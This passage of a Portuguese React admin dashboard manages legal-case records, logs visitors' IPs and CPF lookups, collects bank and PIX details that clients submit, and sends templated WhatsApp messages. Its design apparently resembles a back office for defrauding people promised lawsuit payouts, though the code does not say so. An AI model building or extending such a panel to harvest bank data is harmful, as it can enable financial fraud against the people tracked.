                            onClick={() => setDeleteDadoConfirm(p.id)}
                            className="p-2 text-gray-500 hover:text-red-400 hover:bg-red-500/10 rounded-lg transition-all cursor-pointer"
                            title="Excluir"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </>
          )}

          {/* CONTEÚDO DA ABA ACESSOS */}
          {activeTab === 'acessos' && (
            <>
              {/* Stats de Acessos */}
              <div className="grid grid-cols-4 gap-4 mb-8">
                <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-5">
                  <div className="flex items-center gap-3 mb-2">
                    <Activity className="w-5 h-5 text-[#2364af]" />
                    <p className="text-xs text-gray-500">Total de Acessos</p>
                  </div>
                  <p className="text-2xl font-bold text-white">{acessosStats.total}</p>
                </div>
                <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-5">
                  <div className="flex items-center gap-3 mb-2">
                    <Calendar className="w-5 h-5 text-emerald-500" />
                    <p className="text-xs text-gray-500">Hoje</p>
                  </div>
                  <p className="text-2xl font-bold text-white">{acessosStats.hoje}</p>
                </div>
                <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-5">
                  <div className="flex items-center gap-3 mb-2">
                    <Monitor className="w-5 h-5 text-violet-500" />
                    <p className="text-xs text-gray-500">Desktop</p>
                  </div>
                  <p className="text-2xl font-bold text-white">
                    {acessosStats.dispositivos?.find(d => d.dispositivo?.toLowerCase().includes('desktop'))?.count || 0}
                  </p>
                </div>
                <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-5">
                  <div className="flex items-center gap-3 mb-2">
                    <Smartphone className="w-5 h-5 text-amber-500" />
                    <p className="text-xs text-gray-500">Mobile</p>
                  </div>
                  <p className="text-2xl font-bold text-white">
                    {acessosStats.dispositivos?.find(d => d.dispositivo?.toLowerCase().includes('mobile'))?.count || 0}
                  </p>
                </div>
              </div>

              {/* Tabela de Acessos */}
              <div className="bg-[#1e293b] rounded-2xl border border-white/5 overflow-hidden">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b border-white/5">
                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Data/Hora</th>
                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">IP</th>
                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">CPF Consultado</th>
                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Dispositivo</th>
                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Navegador</th>
                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">País/Cidade</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-white/5">
                    {acessos.length === 0 ? (
                      <tr>
                        <td colSpan={6} className="px-6 py-20 text-center">
                          <Globe className="w-12 h-12 text-gray-700 mx-auto mb-4" />
                          <p className="text-gray-400 font-medium mb-1">Nenhum acesso registrado</p>
                          <p className="text-gray-600 text-xs">Os acessos serão registrados automaticamente</p>
                        </td>
                      </tr>
                    ) : acessos.map(acesso => (
                      <tr key={acesso.id} className="hover:bg-white/5 transition-colors">
                        <td className="px-6 py-4">
                          <div className="flex items-center gap-2">
                            <Clock className="w-4 h-4 text-gray-500" />
                            <span className="text-white text-sm">
                              {new Date(acesso.criado_em).toLocaleString('pt-BR')}
                            </span>
                          </div>
                        </td>
                        <td className="px-6 py-4">
                          <span className="text-white font-mono text-sm">{acesso.ip || '-'}</span>
                        </td>
                        <td className="px-6 py-4">
                          <span className="text-white text-sm">{acesso.cpf_consultado || '-'}</span>
                        </td>
                        <td className="px-6 py-4">
                          <div className="flex items-center gap-2">
                            {acesso.dispositivo?.toLowerCase().includes('mobile') ? (
                              <Smartphone className="w-4 h-4 text-amber-500" />
                            ) : (
                              <Monitor className="w-4 h-4 text-violet-500" />
                            )}
                            <span className="text-gray-300 text-sm">{acesso.dispositivo || '-'}</span>
                          </div>
                        </td>
                        <td className="px-6 py-4">
                          <span className="text-gray-300 text-sm">{acesso.navegador || '-'}</span>
                        </td>
                        <td className="px-6 py-4">
                          <div className="flex items-center gap-2">
                            <Globe className="w-4 h-4 text-emerald-500" />
                            <span className="text-gray-300 text-sm">
                              {acesso.pais || 'Brasil'}{acesso.cidade ? `, ${acesso.cidade}` : ''}
                            </span>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>

                {/* Paginação de Acessos */}
                {acessosPagination.totalPages > 1 && (
                  <div className="flex items-center justify-between px-6 py-4 border-t border-white/5">
                    <p className="text-sm text-gray-500">
                      Mostrando <span className="text-white font-medium">{((acessosPage - 1) * 50) + 1}</span> a{' '}
                      <span className="text-white font-medium">{Math.min(acessosPage * 50, acessosPagination.total)}</span> de{' '}
                      <span className="text-white font-medium">{acessosPagination.total}</span> acessos
                    </p>
                    <div className="flex items-center gap-2">
                      <button
                        onClick={() => setAcessosPage(p => Math.max(1, p - 1))}
                        disabled={acessosPage === 1}
                        className="px-3 py-2 rounded-lg text-sm font-medium disabled:opacity-30 disabled:cursor-not-allowed text-gray-400 hover:bg-white/5 hover:text-white transition-colors"
                      >
                        Anterior
                      </button>
                      <span className="text-gray-400 text-sm">
                        Página {acessosPage} de {acessosPagination.totalPages}
                      </span>
                      <button
                        onClick={() => setAcessosPage(p => Math.min(acessosPagination.totalPages, p + 1))}
                        disabled={acessosPage === acessosPagination.totalPages}
                        className="px-3 py-2 rounded-lg text-sm font-medium disabled:opacity-30 disabled:cursor-not-allowed text-gray-400 hover:bg-white/5 hover:text-white transition-colors"
                      >
                        Próxima
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </>
          )}

          {/* CONTEÚDO DA ABA CONFIGURAÇÕES */}
          {activeTab === 'configuracoes' && (
            <div className="space-y-6">
              {/* WhatsApp Config */}
              <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-6">
                <div className="flex items-center gap-3 mb-6">
                  <div className="w-10 h-10 bg-emerald-500/10 rounded-xl flex items-center justify-center">
                    <MessageSquare className="w-5 h-5 text-emerald-500" />
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold text-white">Configurações do WhatsApp</h3>
                    <p className="text-sm text-gray-500">Configure número e mensagem automática</p>
                  </div>
                </div>

                <div className="space-y-4">
                  <div>
                    <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">
                      Número do WhatsApp (com código do país)
                    </label>
                    <input
                      type="text"
                      value={config.whatsapp_numero || ''}
                      onChange={e => setConfig({ ...config, whatsapp_numero: e.target.value })}
                      placeholder="5511999999999"
                      className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm"
                    />
                    <p className="text-xs text-gray-500 mt-1">Formato: código do país + DDD + número (sem espaços ou símbolos)</p>
                  </div>

                  <div>
                    <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">
                      Mensagem Automática
                    </label>
                    <textarea
                      value={config.whatsapp_mensagem || ''}
                      onChange={e => setConfig({ ...config, whatsapp_mensagem: e.target.value })}
                      rows={8}
                      placeholder="Digite a mensagem..."
                      className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm font-mono resize-none"
                    />
                    <div className="mt-2 p-3 bg-[#0f172a] rounded-lg border border-white/5">
                      <p className="text-xs font-semibold text-gray-400 mb-2">Variáveis disponíveis:</p>
                      <div className="flex flex-wrap gap-2">
                        {['{nome}', '{processo}', '{cpf}', '{banco}', '{agencia}', '{conta}', '{tipo_conta}', '{titular}', '{cpf_titular}', '{pix}'].map(v => (
                          <code key={v} className="px-2 py-1 bg-[#2364af]/20 text-[#2364af] rounded text-xs">{v}</code>
                        ))}
                      </div>
                    </div>
                  </div>

                  <button
                    onClick={saveConfig}
                    disabled={savingConfig}
                    className="bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 disabled:opacity-50 text-white px-6 py-3 rounded-xl text-sm font-semibold flex items-center gap-2 transition-all"
                  >
                    {savingConfig ? (
                      <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    ) : (
                      <Save className="w-4 h-4" />
                    )}
                    Salvar Configurações
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      </main>

      {/* Toast de Importação */}
      {(importing || importResult) && (
        <div className="fixed top-4 right-4 z-50 animate-slideUp">
          <div className={`rounded-xl shadow-2xl p-4 min-w-[300px] border ${
            importing ? 'bg-[#1e293b] border-white/10' :
            importResult?.error ? 'bg-red-900/90 border-red-500/30' :
            'bg-emerald-900/90 border-emerald-500/30'
          }`}>
            {importing ? (
              <div className="flex items-center gap-3">
                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                <span className="text-white text-sm font-medium">Importando processos...</span>
              </div>
            ) : importResult?.error ? (
              <div className="flex items-start gap-3">
                <AlertCircle className="w-5 h-5 text-red-400 shrink-0" />
                <div>
                  <p className="text-red-200 text-sm font-medium">Erro na importação</p>
                  <p className="text-red-300/70 text-xs mt-1">{importResult.error}</p>
                </div>
                <button onClick={() => setImportResult(null)} className="ml-auto text-red-400 hover:text-red-200">
                  <X className="w-4 h-4" />
                </button>
              </div>
            ) : (
              <div className="flex items-start gap-3">
                <CheckCircle className="w-5 h-5 text-emerald-400 shrink-0" />
                <div>
                  <p className="text-emerald-200 text-sm font-medium">Importação concluída!</p>
                  <p className="text-emerald-300/70 text-xs mt-1">
                    {importResult?.importados} de {importResult?.total} processos importados
                    {importResult?.erros > 0 && ` (${importResult.erros} erros)`}
                  </p>
                </div>
                <button onClick={() => setImportResult(null)} className="ml-auto text-emerald-400 hover:text-emerald-200">
                  <X className="w-4 h-4" />
                </button>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Modal Novo/Editar Processo */}
      {showModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={() => setShowModal(false)} />
          <div className="relative bg-[#1e293b] rounded-2xl shadow-2xl w-full max-w-lg max-h-[90vh] overflow-y-auto border border-white/10">
            <div className="flex items-center justify-between px-6 py-4 border-b border-white/5">
              <h3 className="text-lg font-bold text-white">{editing ? 'Editar Processo' : 'Novo Processo'}</h3>
              <button onClick={() => setShowModal(false)} className="p-2 text-gray-400 hover:text-white hover:bg-white/5 rounded-lg transition-all cursor-pointer">
                <X className="w-5 h-5" />
              </button>
            </div>
            <form onSubmit={handleSave} className="p-6 space-y-4">
              <div>
                <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Nome Completo</label>
                <input type="text" required value={form.nome} onChange={e => setForm({ ...form, nome: e.target.value })}
                  className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm" placeholder="Nome do cliente" />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">CPF</label>
                  <input type="text" required value={form.cpf} onChange={e => setForm({ ...form, cpf: formatCPFInput(e.target.value) })}
                    className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm" placeholder="000.000.000-00" />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Nº do Processo</label>
                  <input type="text" required value={form.numero_processo} onChange={e => setForm({ ...form, numero_processo: e.target.value })}
                    className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm" placeholder="0000000-00.0000.0.00.0000" />
                </div>
              </div>
              <div>
                <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Advogado Responsável</label>
                <input type="text" required value={form.advogado} onChange={e => setForm({ ...form, advogado: e.target.value })}
                  className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm" placeholder="Nome do advogado" />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Valor a Receber (R$)</label>
                  <input type="text" value={form.valor_receber} onChange={e => setForm({ ...form, valor_receber: formatCurrencyInput(e.target.value) })}
                    className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm" placeholder="0,00" />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Valor Pendente (R$)</label>
                  <input type="text" value={form.valor_pendente} onChange={e => setForm({ ...form, valor_pendente: formatCurrencyInput(e.target.value) })}
                    className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm" placeholder="0,00" />
                </div>
              </div>
              <div>
                <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Status</label>
                <div className="relative">
                  <select value={form.status} onChange={e => setForm({ ...form, status: e.target.value })}
                    className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white appearance-none cursor-pointer focus:border-[#2364af] transition-all text-sm">
                    {STATUS_OPTIONS.map(s => <option key={s} value={s}>{s}</option>)}
                  </select>
                  <ChevronDown className="w-4 h-4 text-gray-500 absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none" />
                </div>
              </div>

              {/* Divider */}
              <div className="border-t border-white/10 pt-4 mt-4">
                <p className="text-xs font-bold text-[#2364af] uppercase tracking-wider mb-4 flex items-center gap-2">
                  <Users className="w-4 h-4" />
                  Detalhes da Ação
                </p>
              </div>

              <div>
                <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Polo Ativo (Autor)</label>
                <input type="text" value={form.polo_ativo} onChange={e => setForm({ ...form, polo_ativo: e.target.value })}
                  className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm" placeholder="Nome do autor da ação" />
              </div>
              <div>
                <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Polo Passivo (Réu)</label>
                <input type="text" value={form.polo_passivo} onChange={e => setForm({ ...form, polo_passivo: e.target.value })}
                  className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm" placeholder="Nome do réu" />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Vara</label>
                  <input type="text" value={form.vara} onChange={e => setForm({ ...form, vara: e.target.value })}
                    className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm" placeholder="Ex: 2ª Vara Cível" />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Comarca</label>
                  <input type="text" value={form.comarca} onChange={e => setForm({ ...form, comarca: e.target.value })}
                    className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm" placeholder="Ex: São Paulo/SP" />
                </div>
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Classe</label>
                  <input type="text" value={form.classe} onChange={e => setForm({ ...form, classe: e.target.value })}
                    className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm" placeholder="Ex: Procedimento Comum Cível" />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Assunto</label>
                  <input type="text" value={form.assunto} onChange={e => setForm({ ...form, assunto: e.target.value })}
                    className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm" placeholder="Ex: Indenização por Dano Moral" />
                </div>
              </div>

              <div className="flex gap-3 pt-4">
                <button type="button" onClick={() => setShowModal(false)}
                  className="flex-1 px-4 py-3 border border-white/10 rounded-xl text-sm font-semibold text-gray-400 hover:bg-white/5 transition-all cursor-pointer">
                  Cancelar
                </button>
                <button type="submit" disabled={saving}
                  className="flex-1 px-4 py-3 bg-gradient-to-r from-[#2364af] to-[#1a4f8f] text-white rounded-xl text-sm font-semibold flex items-center justify-center gap-2 transition-all disabled:opacity-60 cursor-pointer shadow-lg shadow-[#2364af]/20">
                  {saving ? <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <><Save className="w-4 h-4" />{editing ? 'Salvar' : 'Cadastrar'}</>}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Modal Detalhes Completos */}
      {showDetailModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={() => setShowDetailModal(null)} />
          <div className="relative bg-[#1e293b] rounded-2xl shadow-2xl w-full max-w-2xl max-h-[90vh] overflow-y-auto border border-white/10">
            {/* Header */}
            <div className="sticky top-0 z-10 flex items-center justify-between px-6 py-4 border-b border-white/5 bg-[#1e293b] rounded-t-2xl">
              <div className="flex items-center gap-4">
                <div className="w-12 h-12 bg-gradient-to-br from-[#2364af]/20 to-[#1a4f8f]/20 rounded-full flex items-center justify-center">
                  <span className="text-lg font-bold text-[#2364af]">{showDetailModal.processo.nome.charAt(0).toUpperCase()}</span>
                </div>
                <div>
                  <h3 className="text-lg font-bold text-white">{showDetailModal.processo.nome}</h3>
                  <p className="text-xs text-gray-500 font-mono">{showDetailModal.processo.cpf}</p>
                </div>
              </div>
              <button onClick={() => setShowDetailModal(null)} className="p-2 text-gray-400 hover:text-white hover:bg-white/5 rounded-lg transition-all cursor-pointer">
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="p-6 space-y-6">
              {/* Seção: Dados do Processo */}
              <div>
                <div className="flex items-center gap-2 mb-4">
                  <Gavel className="w-4 h-4 text-[#2364af]" />
                  <h4 className="text-sm font-bold text-white uppercase tracking-wider">Dados do Processo</h4>
                </div>
                <div className="bg-[#0f172a] rounded-xl border border-white/5 p-5">
                  <div className="grid grid-cols-2 gap-4 mb-4">
                    <div>
                      <p className="text-[10px] text-gray-500 uppercase tracking-wider font-semibold mb-1">Número do Processo</p>
                      <p className="text-sm font-mono font-semibold text-white">{showDetailModal.processo.numero_processo}</p>
                    </div>
                    <div>
                      <p className="text-[10px] text-gray-500 uppercase tracking-wider font-semibold mb-1">Advogado</p>
                      <p className="text-sm font-semibold text-white">{showDetailModal.processo.advogado}</p>
                    </div>
                  </div>
                  <div className="grid grid-cols-3 gap-3">
                    <div className="bg-emerald-500/10 rounded-lg p-3 border border-emerald-500/20">
                      <p className="text-[10px] text-emerald-400 uppercase tracking-wider font-semibold mb-1">Valor a Receber</p>
                      <p className="text-lg font-bold text-emerald-400">{formatCurrency(showDetailModal.processo.valor_receber)}</p>
                    </div>
                    <div className="bg-amber-500/10 rounded-lg p-3 border border-amber-500/20">
                      <p className="text-[10px] text-amber-400 uppercase tracking-wider font-semibold mb-1">Valor Pendente</p>
                      <p className="text-lg font-bold text-amber-400">{formatCurrency(showDetailModal.processo.valor_pendente)}</p>
                    </div>
                    <div className="bg-white/5 rounded-lg p-3 border border-white/10">
                      <p className="text-[10px] text-gray-400 uppercase tracking-wider font-semibold mb-1">Status</p>
                      <div className="flex items-center gap-2">
                        <span className={`w-2 h-2 rounded-full ${statusConfig(showDetailModal.processo.status).dot}`} />
                        <p className="text-sm font-semibold text-white">{showDetailModal.processo.status}</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Seção: Dados Bancários */}
              <div>
                <div className="flex items-center gap-2 mb-4">
                  <Landmark className="w-4 h-4 text-[#2364af]" />
                  <h4 className="text-sm font-bold text-white uppercase tracking-wider">Dados Bancários Enviados</h4>
                  {showDetailModal.dados.length > 0 && (
                    <span className="ml-auto text-xs font-semibold px-2.5 py-1 rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                      {showDetailModal.dados.length} {showDetailModal.dados.length === 1 ? 'envio' : 'envios'}
                    </span>
                  )}
                </div>

                {showDetailModal.dados.length === 0 ? (
                  <div className="bg-[#0f172a] rounded-xl border border-white/5 p-10 text-center">
                    <Landmark className="w-12 h-12 text-gray-700 mx-auto mb-4" />
                    <p className="text-gray-400 font-medium mb-1">Nenhum dado bancário enviado ainda</p>
                    <p className="text-gray-600 text-xs">Os dados aparecerão aqui quando o cliente preencher o formulário</p>
                  </div>
                ) : (
                  <div className="space-y-3">
                    {showDetailModal.dados.map((dado, idx) => (
                      <div key={dado.id || idx} className="bg-[#0f172a] rounded-xl border border-white/5 overflow-hidden">
                        {/* Card header com data */}
                        <div className="px-4 py-3 border-b border-white/5 flex items-center justify-between bg-white/[0.02]">
                          <div className="flex items-center gap-3">
                            <div className="flex items-center gap-2 text-xs text-gray-400">
                              <Calendar className="w-3.5 h-3.5" />
                              <span>{formatDate(dado.criado_em)}</span>
                            </div>
                            <span className="text-xs text-gray-600">({timeAgo(dado.criado_em)})</span>
                          </div>
                          <div className="flex items-center gap-2">
                            <span className={`text-[10px] font-semibold px-2.5 py-1 rounded-lg ${
                              dado.tipo_conta === 'poupanca' ? 'bg-blue-500/10 text-blue-400 border border-blue-500/20' : 'bg-gray-500/10 text-gray-400 border border-gray-500/20'
                            }`}>
                              {dado.tipo_conta === 'poupanca' ? 'Poupança' : 'Corrente'}
                            </span>
                            {deleteDadoConfirm === dado.id ? (
                              <div className="flex items-center gap-1">
                                <button
                                  onClick={() => handleDeleteDado(dado.id)}
                                  className="px-2 py-1 bg-red-500 text-white text-[10px] font-semibold rounded-lg hover:bg-red-600 cursor-pointer"
                                >
                                  Confirmar
                                </button>
                                <button
                                  onClick={() => setDeleteDadoConfirm(null)}
                                  className="px-2 py-1 bg-gray-700 text-gray-300 text-[10px] font-semibold rounded-lg hover:bg-gray-600 cursor-pointer"
                                >
                                  Cancelar
                                </button>
                              </div>
                            ) : (
                              <button
                                onClick={() => setDeleteDadoConfirm(dado.id)}
                                className="p-1.5 text-gray-500 hover:text-red-400 hover:bg-red-500/10 rounded-lg transition-all cursor-pointer"
                                title="Excluir dados bancários"
                              >
                                <Trash2 className="w-3.5 h-3.5" />
                              </button>
                            )}
                          </div>
                        </div>

                        <div className="p-4">
                          {/* Titular e Telefone */}
                          <div className="grid grid-cols-2 gap-4 mb-4">
                            <div className="flex items-start gap-3">
                              <div className="w-9 h-9 bg-[#2364af]/10 rounded-lg flex items-center justify-center shrink-0">
                                <User className="w-4 h-4 text-[#2364af]" />
                              </div>
                              <div>
                                <p className="text-[10px] text-gray-500 uppercase tracking-wider font-semibold">Titular</p>
                                <p className="text-sm font-medium text-white">{dado.titular || '-'}</p>
                                <p className="text-xs text-gray-500 font-mono">{dado.cpf_titular || dado.cpf}</p>
                              </div>
                            </div>
                            <div className="flex items-start gap-3">
                              <div className="w-9 h-9 bg-[#2364af]/10 rounded-lg flex items-center justify-center shrink-0">
                                <Phone className="w-4 h-4 text-[#2364af]" />
                              </div>
                              <div>
                                <p className="text-[10px] text-gray-500 uppercase tracking-wider font-semibold">Telefone</p>
                                <p className="text-sm font-medium text-white">{dado.telefone}</p>
                              </div>
                            </div>
                          </div>

                          {/* Dados bancários */}
                          <div className="bg-white/[0.02] rounded-lg p-4 grid grid-cols-4 gap-4 border border-white/5">
                            <div>
                              <p className="text-[10px] text-gray-500 uppercase tracking-wider font-semibold mb-1">Banco</p>
                              <p className="text-xs font-semibold text-white">{dado.banco}</p>
                            </div>
                            <div>
                              <p className="text-[10px] text-gray-500 uppercase tracking-wider font-semibold mb-1">Agência</p>
                              <p className="text-sm font-mono font-semibold text-white">{dado.agencia}</p>
                            </div>
                            <div>
                              <p className="text-[10px] text-gray-500 uppercase tracking-wider font-semibold mb-1">Conta</p>
                              <p className="text-sm font-mono font-semibold text-white">{dado.conta}</p>
                            </div>
                            {dado.chave_pix && (
                              <div>
                                <p className="text-[10px] text-emerald-400 uppercase tracking-wider font-semibold mb-1">Chave PIX</p>
                                <p className="text-xs font-semibold text-emerald-400 break-all">{dado.chave_pix}</p>
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>

            {/* Footer */}
            <div className="sticky bottom-0 px-6 py-4 border-t border-white/5 bg-[#1e293b] rounded-b-2xl flex gap-3">
              <button
                onClick={() => setShowDetailModal(null)}
                className="flex-1 py-3 border border-white/10 rounded-xl text-sm font-semibold text-gray-400 hover:bg-white/5 transition-all cursor-pointer"
              >
                Fechar
              </button>
              <button
                onClick={() => { setShowDetailModal(null); openEdit(showDetailModal.processo) }}
                className="flex-1 py-3 bg-gradient-to-r from-[#2364af] to-[#1a4f8f] text-white rounded-xl text-sm font-semibold flex items-center justify-center gap-2 transition-all cursor-pointer shadow-lg shadow-[#2364af]/20"
              >
                <Pencil className="w-4 h-4" />
                Editar Processo
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
